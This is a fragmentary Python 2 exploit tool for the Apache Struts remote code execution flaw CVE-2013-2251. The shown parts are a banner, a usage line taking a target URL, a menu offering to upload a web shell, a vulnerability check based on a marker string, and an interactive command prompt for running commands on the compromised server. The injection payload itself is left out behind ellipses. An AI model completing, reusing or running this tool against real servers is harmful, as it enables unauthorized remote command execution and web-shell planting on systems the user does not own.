...
▄▄▄█ ▀░░▀ ▀▀▀ ▀░░░▀ ▀░▀▀ ▀▀▀▀ ▀▀▀ ░░▀░░ ▀░░▀ ▀▀▀
        ...
        =[ Struts Pwning 2021 / AKINCILAR ]=
              By @ynsmroztas                                                                                                         
'''+ENDC

if len(sys.argv) < 2:
	print logo
	print "\nUso: python ApacheStruts.py http(s)://www.target.com/files.login\n"
	sys.exit(1)
print logo
...
def info():
	print RED+"   [-] GET PROMPT...\n"+ENDC
	print BOLD+"   * [UPLOAD SHELL]"+ENDC
	print OTRO+"     mit@cw:$ pwnd (php)"+ENDC
...
if len(host) > 0:
	if host.find("https://") != -1 or host.find("http://") != -1:
		...
		if "chapalapachala" in response:
				...
				opcion = raw_input(WHITE+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
				if opcion == 's':
					info()
					identTools()
					
					while 1:
						separador = raw_input(GREEN+"mit@CVE-2013-2251 $ "+ENDC)
